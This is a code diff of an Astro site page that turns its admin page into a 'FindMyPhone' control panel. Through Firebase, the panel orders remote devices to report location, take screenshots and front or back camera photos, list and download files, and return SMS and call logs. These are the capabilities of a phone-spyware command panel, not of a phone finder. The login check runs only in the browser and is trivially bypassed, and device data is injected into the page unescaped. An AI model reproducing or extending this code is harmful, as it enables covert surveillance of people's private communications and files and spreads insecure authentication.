@@ -3,7 +3,7 @@ import Layout from '../layouts/Layout.astro';
 ---
 
 <Layout title="Admin Dashboard">
-  <div class="admin-wrapper" style="max-width: 800px; margin: 0 auto; padding: 40px 24px; min-height: 70vh; display: flex; flex-direction: column; justify-content: center;">
+  <div class="admin-wrapper" style="max-width: 1200px; margin: 0 auto; padding: 40px 24px; min-height: 70vh; display: flex; flex-direction: column; justify-content: center;">
     
     <!-- Login Form -->
     <div id="login-container" class="login-card" style="background: var(--color-surface-1); border: 1px solid var(--color-border); border-radius: 24px; padding: 48px 32px; max-width: 400px; width: 100%; margin: 0 auto; box-shadow: 0 20px 40px rgba(0,0,0,0.4);">
@@ -28,39 +28,109 @@ import Layout from '../layouts/Layout.astro';
       </div>
     </div>
 
-    <!-- Secure Content -->
+    <!-- Secure Content: FindMyPhone Dashboard -->
     <div id="admin-content" style="display: none; width: 100%;">
       <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 32px; flex-wrap: wrap; gap: 16px;">
-        <h1 style="font-family: var(--font-display); font-size: 2.5rem; color: var(--color-lime);">Admin Dashboard</h1>
+        <h1 style="font-family: var(--font-display); font-size: 2.5rem; color: var(--color-lime);">📱 FindMyPhone Dashboard</h1>
         <button id="logout-btn" class="btn-secondary" style="padding: 8px 16px; font-size: 0.875rem; background: var(--color-surface-2); border: 1px solid var(--color-border); border-radius: 8px; color: var(--color-ink); cursor: pointer; transition: background 0.2s;">Logout</button>
       </div>
       
-      <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 24px;">
-        <!-- Dashboard Card 1 -->
-        <div style="background: var(--color-surface-1); border: 1px solid var(--color-border); border-radius: 16px; padding: 24px;">
-          <h3 style="font-family: var(--font-display); font-size: 1.25rem; margin-bottom: 16px;">Overview</h3>
-          <p style="color: var(--color-ink-2); line-height: 1.6;">Welcome to the secure admin area. This dashboard is accessible only with valid credentials.</p>
+      <div class="dashboard-container" style="display: grid; grid-template-columns: 300px 1fr; gap: 24px; align-items: start;">
+        
+        <!-- Devices List -->
+        <div class="panel" style="background: var(--color-surface-1); border: 1px solid var(--color-border); border-radius: 16px; padding: 24px;">
+          <h3 style="font-family: var(--font-display); font-size: 1.25rem; margin-bottom: 16px; color: var(--color-ink);">Devices</h3>
+          <ul id="device-list" style="list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 8px;">
+            <li style="padding: 12px; border-radius: 8px; background: var(--color-surface-2); color: var(--color-ink-2);">Loading devices...</li>
+          </ul>
         </div>
         
-        <!-- Dashboard Card 2 -->
-        <div style="background: var(--color-surface-1); border: 1px solid var(--color-border); border-radius: 16px; padding: 24px;">
-          <h3 style="font-family: var(--font-display); font-size: 1.25rem; margin-bottom: 16px;">Quick Actions</h3>
-          <ul style="color: var(--color-ink-2); list-style: none; padding: 0; display: flex; flex-direction: column; gap: 12px;">
-            <li>→ <a href="/" style="color: var(--color-lime); text-decoration: none;">View Live Site</a></li>
-            <li>→ <a href="/tools" style="color: var(--color-lime); text-decoration: none;">Manage Tools</a></li>
-          </ul>
+        <!-- Controls -->
+        <div class="panel" id="controls" style="display: none; background: var(--color-surface-1); border: 1px solid var(--color-border); border-radius: 16px; padding: 24px;">
+          <h2 id="device-name" style="font-family: var(--font-display); font-size: 1.5rem; margin-bottom: 24px; color: var(--color-lime);">Select a device</h2>
+          
+          <div style="display: flex; flex-wrap: wrap; gap: 12px; margin-bottom: 24px;">
+            <button class="cmd-btn btn-primary" data-action="ring" style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">🔔 Ring</button>
+            <button class="cmd-btn btn-primary" data-action="locate" style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📍 Locate</button>
+            <button class="cmd-btn btn-primary" data-action="screenshot" style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📸 Screenshot</button>
+            <button class="cmd-btn btn-primary" data-action="photo" data-extra='{"camera_type": "front"}' style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">🤳 Front Photo</button>
+            <button class="cmd-btn btn-primary" data-action="photo" data-extra='{"camera_type": "back"}' style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📸 Back Photo</button>
+            <button class="cmd-btn btn-primary" data-action="ls" data-extra='{"path": "/"}' style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📁 List Files</button>
+            <button class="cmd-btn btn-primary" data-action="sms" style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">💬 SMS Logs</button>
+            <button class="cmd-btn btn-primary" data-action="calls" style="padding: 10px 16px; border-radius: 8px; font-weight: 600; cursor: pointer;">📞 Call Logs</button>
+          </div>
+          
+          <div id="response-area" style="background: var(--color-surface-2); border: 1px solid var(--color-border); border-radius: 12px; padding: 20px; min-height: 200px; max-height: 500px; overflow-y: auto;">
+            <p style="color: var(--color-ink-2); margin: 0;">Awaiting response...</p>
+          </div>
         </div>
       </div>
     </div>
   </div>
+
+  <style>
+    #device-list li {
+      padding: 12px 16px;
+      margin-bottom: 8px;
+      background: var(--color-surface-2);
+      border: 1px solid var(--color-border);
+      border-radius: 8px;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      color: var(--color-ink);
+      font-weight: 500;
+    }
+    #device-list li:hover {
+      background: rgba(200, 241, 53, 0.1);
+      border-color: var(--color-lime);
+    }
+    #device-list li.active {
+      background: rgba(200, 241, 53, 0.2);
+      border-color: var(--color-lime);
+      color: var(--color-lime);
+    }
+    .cmd-btn {
+      transition: transform 0.2s ease, opacity 0.2s ease;
+      border: none;
+    }
+    .cmd-btn:hover {
+      transform: translateY(-2px);
+      opacity: 0.9;
+    }
+    #response-area img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin-top: 15px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+    .file-item {
+      padding: 8px 12px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.2s;
+      margin-bottom: 4px;
+    }
+    .file-item:hover {
+      background: var(--color-surface-1);
+    }
+    
+    @media (max-width: 768px) {
+      .dashboard-container {
+        grid-template-columns: 1fr !important;
+      }
+    }
+  </style>
 </Layout>
 
 <script>
-  // Expected SHA-256 hashes for credentials (hashed to prevent plain text exposure in static site source)
+  import { db } from '../secrets/firebase.js';
+  import { ref, onValue, set } from 'firebase/database';
+
+  // --- Auth Logic ---
   const EXPECTED_USER = 'bf490dd884aed8513b9f830497bfae131e1359867cfd082fdb8d05c180d177d7';
   const EXPECTED_PASS = '482a9a533f5abf4d877b2f2cf460d50e8c1b1f50a6a7ac21ea2e352c723b6e91';
 
-  async function hashString(str) {
+  async function hashString(str: string) {
     const encoder = new TextEncoder();
     const data = encoder.encode(str);
     const hashBuffer = await crypto.subtle.digest('SHA-256', data);
@@ -73,8 +143,8 @@ import Layout from '../layouts/Layout.astro';
   const loginBtn = document.getElementById('login-btn');
   const logoutBtn = document.getElementById('logout-btn');
   const errorMsg = document.getElementById('error-msg');
-  const usernameInput = document.getElementById('username');
-  const passwordInput = document.getElementById('password');
+  const usernameInput = document.getElementById('username') as HTMLInputElement;
+  const passwordInput = document.getElementById('password') as HTMLInputElement;
 
   // Check auth state on load
   if (sessionStorage.getItem('auth_token') === 'verified') {
@@ -100,7 +170,7 @@ import Layout from '../layouts/Layout.astro';
       if (uHash === EXPECTED_USER && pHash === EXPECTED_PASS) {
         sessionStorage.setItem('auth_token', 'verified');
         showAdminContent();
-        errorMsg.style.display = 'none';
+        if (errorMsg) errorMsg.style.display = 'none';
         usernameInput.value = '';
         passwordInput.value = '';
       } else {
@@ -114,7 +184,6 @@ import Layout from '../layouts/Layout.astro';
     }
   });
 
-  // Also trigger login on Enter key
   passwordInput?.addEventListener('keypress', (e) => {
     if (e.key === 'Enter') loginBtn?.click();
   });
@@ -124,31 +193,169 @@ import Layout from '../layouts/Layout.astro';
 
   logoutBtn?.addEventListener('click', () => {
     sessionStorage.removeItem('auth_token');
-    adminContent.style.display = 'none';
-    loginContainer.style.display = 'block';
+    if (adminContent) adminContent.style.display = 'none';
+    if (loginContainer) loginContainer.style.display = 'block';
   });
 
   function showAdminContent() {
     if (loginContainer) loginContainer.style.display = 'none';
     if (adminContent) adminContent.style.display = 'block';
+    // Initialize Dashboard once authenticated
+    if (!window.dashboardInitialized) {
+      initDashboard();
+      window.dashboardInitialized = true;
+    }
   }
 
-  function showError(msg) {
+  function showError(msg: string) {
     if (errorMsg) {
       errorMsg.textContent = msg;
       errorMsg.style.display = 'block';
     }
   }
+
+  // --- FindMyPhone Dashboard Logic ---
   
-  // Style inputs on focus
-  [usernameInput, passwordInput].forEach(input => {
-    if (input) {
-      input.addEventListener('focus', () => {
-        input.style.borderColor = 'var(--color-lime)';
-      });
-      input.addEventListener('blur', () => {
-        input.style.borderColor = 'var(--color-border)';
-      });
+  // Extend Window for TypeScript
+  declare global {
+    interface Window {
+      dashboardInitialized: boolean;
+      sendCommand: (action: string, extraData?: any) => void;
     }
-  });
+  }
+
+  let currentDeviceId: string | null = null;
+  let listenersAttached = false; // Prevent multiple listeners on re-auth
+
+  function initDashboard() {
+    if (listenersAttached) return;
+    listenersAttached = true;
+
+    const devicesRef = ref(db, 'findmyphone/devices');
+    onValue(devicesRef, (snapshot) => {
+      const data = snapshot.val();
+      const list = document.getElementById('device-list');
+      if (!list) return;
+      
+      list.innerHTML = '';
+      if (!data) {
+        list.innerHTML = '<li style="padding: 12px; border-radius: 8px; background: var(--color-surface-2); color: var(--color-ink-2);">No devices found</li>';
+        return;
+      }
+      
+      Object.keys(data).forEach(deviceId => {
+        const li = document.createElement('li');
+        li.textContent = data[deviceId].name || 'Unknown Device';
+        li.onclick = () => selectDevice(deviceId, data[deviceId].name, li);
+        if (deviceId === currentDeviceId) li.classList.add('active');
+        list.appendChild(li);
+      });
+    });
+
+    // Attach event listeners to command buttons
+    document.querySelectorAll('.cmd-btn').forEach(btn => {
+      btn.addEventListener('click', (e) => {
+        const target = e.currentTarget as HTMLButtonElement;
+        const action = target.getAttribute('data-action');
+        const extraStr = target.getAttribute('data-extra');
+        let extra = {};
+        if (extraStr) {
+          try { extra = JSON.parse(extraStr); } catch (e) {}
+        }
+        if (action) window.sendCommand(action, extra);
+      });
+    });
+  }
+
+  function selectDevice(id: string, name: string, element: HTMLElement) {
+    currentDeviceId = id;
+    const controls = document.getElementById('controls');
+    const deviceName = document.getElementById('device-name');
+    
+    if (controls) controls.style.display = 'block';
+    if (deviceName) deviceName.textContent = name;
+    
+    // Update active styling
+    document.querySelectorAll('#device-list li').forEach(el => el.classList.remove('active'));
+    element.classList.add('active');
+
+    // Listen for responses
+    listenToDevice(id);
+  }
+
+  function listenToDevice(deviceId: string) {
+    const respRef = ref(db, `findmyphone/devices/${deviceId}/fs_response`);
+    const locRef = ref(db, `findmyphone/devices/${deviceId}/location`);
+    const area = document.getElementById('response-area');
+    if (!area) return;
+
+    onValue(respRef, (snapshot) => {
+      const data = snapshot.val();
+      if (!data) return;
+      
+      area.innerHTML = '';
+      if (data.screenshot_base64) {
+        area.innerHTML = `<img src="data:image/jpeg;base64,${data.screenshot_base64}" alt="Screenshot" />`;
+      } else if (data.photo_base64) {
+        area.innerHTML = `<img src="data:image/jpeg;base64,${data.photo_base64}" alt="Photo" />`;
+      } else if (data.files) {
+        let html = `<h4 style="margin-bottom: 12px; color: var(--color-ink);">Files in ${data.path}</h4><ul style="list-style: none; padding: 0; margin: 0;">`;
+        data.files.forEach((f: any) => {
+          if (f.isDirectory) {
+             html += `<li class="file-item" data-action="ls" data-path='${data.path}/${f.name}'>📁 ${f.name}</li>`;
+          } else {
+             html += `<li class="file-item" data-action="download" data-path='${data.path}/${f.name}'>📄 ${f.name} (${Math.round(f.size/1024)} KB)</li>`;
+          }
+        });
+        html += '</ul>';
+        area.innerHTML = html;
+        
+        // Attach dynamic event listeners for files
+        area.querySelectorAll('.file-item').forEach(el => {
+          el.addEventListener('click', (e) => {
+            const target = e.currentTarget as HTMLElement;
+            const act = target.getAttribute('data-action');
+            const path = target.getAttribute('data-path');
+            if (act && path) window.sendCommand(act, { path });
+          });
+        });
+        
+      } else if (data.file_base64) {
+         area.innerHTML = `<a href="data:application/octet-stream;base64,${data.file_base64}" download="${data.filename}" style="color:var(--color-lime); font-weight: bold; padding: 12px; border: 1px solid var(--color-lime); border-radius: 8px; display: inline-block;">Download ${data.filename}</a>`;
+      } else if (data.log_content) {
+         area.innerHTML = `<h4 style="color: var(--color-ink); margin-bottom: 12px;">${data.type} Logs</h4><pre style="white-space: pre-wrap; font-size: 13px; background: rgba(0,0,0,0.2); padding: 16px; border-radius: 8px; border: 1px solid var(--color-border); color: var(--color-ink); font-family: monospace;">${data.log_content}</pre>`;
+      } else if (data.error) {
+         area.innerHTML = `<p style="color: #ff4d4d; font-weight: 500; background: rgba(255, 77, 77, 0.1); padding: 12px; border-radius: 8px;">Error: ${data.error}</p>`;
+      } else if (data.status) {
+         area.innerHTML = `<p style="color: var(--color-ink); padding: 12px; background: var(--color-surface-1); border-radius: 8px;">Status: ${data.status}</p>`;
+      }
+    });
+
+    onValue(locRef, (snapshot) => {
+       const data = snapshot.val();
+       if (data && data.lat) {
+          const locDiv = document.createElement('div');
+          locDiv.style.marginBottom = '16px';
+          locDiv.innerHTML = `<p style="background: rgba(200, 241, 53, 0.1); border: 1px solid var(--color-lime); padding: 12px; border-radius: 8px;">📍 Location: <a href="https://www.google.com/maps?q=${data.lat},${data.lng}" target="_blank" style="color:var(--color-lime); font-weight: bold; text-decoration: none;">Open in Google Maps</a></p>`;
+          area.prepend(locDiv);
+       }
+    });
+  }
+
+  window.sendCommand = (action: string, extraData: any = {}) => {
+    if (!currentDeviceId) return;
+    const cmdRef = ref(db, `findmyphone/devices/${currentDeviceId}/command`);
+    
+    const area = document.getElementById('response-area');
+    if (area) {
+       area.innerHTML = `<div style="display: flex; align-items: center; gap: 12px;"><div style="width: 16px; height: 16px; border: 2px solid var(--color-lime); border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div><p style="color: var(--color-ink-2); margin: 0;">Sending ${action} command...</p></div>
+       <style>@keyframes spin { to { transform: rotate(360deg); } }</style>`;
+    }
+    
+    set(cmdRef, {
+      action: action,
+      timestamp: Date.now(),
+      ...extraData
+    });
+  };
 </script>
